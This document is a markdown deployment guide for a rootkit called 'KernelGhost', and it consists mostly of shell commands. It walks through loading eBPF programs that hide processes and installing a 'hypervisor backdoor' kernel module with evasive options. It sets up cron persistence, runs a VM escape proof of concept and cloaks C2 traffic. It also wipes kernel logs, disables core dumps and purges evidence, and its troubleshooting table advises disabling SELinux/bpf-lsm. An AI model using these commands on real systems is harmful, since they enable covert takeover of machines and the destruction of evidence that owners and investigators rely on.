# KernelGhost Deployment Guide

## Pre-requisites

### Hardware Setup
```bash
# Enable IOMMU in BIOS
$ dmesg | grep -e DMAR -e IOMMU
[    0.000000] DMAR: IOMMU enabled

# Verify nested virtualization
$ cat /sys/module/kvm_intel/parameters/nested
Y
```

### Software Requirements
```bash
# Ubuntu 22.04+ Setup
sudo apt update && sudo apt install \
linux-headers-$(uname -r) \
clang-15 lld-15 \
bpftool \
qemu-kvm libvirt-daemon-system
```

## Installation

### 1. Build Components
```bash
git clone --depth 1 https://github.com/yourorg/kernelghost
cd kernelghost

# Build all components (kernel module, eBPF, userland)
make all -j$(nproc)
```

### 2. Deploy Stealth Layer
```bash
# Load eBPF programs with stealth mode
sudo bpftool prog loadall src/eBPF_stealth/process_hider.bpf.o /sys/fs/bpf/ghost \
map name ghost_pids pinned /sys/fs/bpf/ghost_pids

# Verify BPF programs
sudo bpftool prog show | grep ghost
```

### 3. Install Hypervisor Backdoor
```bash
# Load kernel module with evasive options
sudo insmod src/hypervisor/kernelghost.ko \
evasive_mode=1 \
payload_addr=0x$(sudo cat /proc/iomem | grep SPI | cut -d'-' -f1)
```

### 4. Configure Persistence
```bash
# Install control utility
sudo make -C src/userland install

# Set up cron persistence
echo "@reboot /usr/local/bin/ghostctl revive --payload /dev/mem" \
| sudo tee /etc/cron.d/ghost_resurrection
```

## Post-Install Verification

### Process Hiding Test
```bash
# Hide current shell process
./examples/process_ghosting $$

# Verify hiding
ps -p $$ # Should show error
cat /proc/$$/status # Permission denied
```

### VM Escape Test
```bash
# On KVM host
./examples/vm_escape_poc

# Expected output
[+] Host memory modified at 0xffff88800a2b8000
```

## Operational Security

### Network Obfuscation
```bash
# Obfuscate C2 traffic on port 443
ghostctl cloak \
--proto tcp \
--port 443 \
--algorithm AES-256-GCM \
--key $(openssl rand -hex 32)
```

### Forensic Protection
```bash
# Wipe kernel logs
ghostctl shred \
--target /var/log/kern.log \
--passes 7 \
--method gutmann

# Disable core dumps
sysctl -w kernel.core_pattern=|/bin/false
```

## Troubleshooting

| Symptom                    | Solution                         |
|----------------------------|----------------------------------|
| BPF program load failed    | Disable SELinux/bpf-lsm          |
| Hypercall not supported    | Enable nested virtualization     |
| VMBus exploit stalls       | Use Windows Server 2022 host     |

## Uninstallation
```bash
# Remove all components
sudo ghostctl purge \
--destroy-evidence \
--shred-payload

# Secure cleanup
make clean && sudo shred -vzn 3 -u kernelghost
```
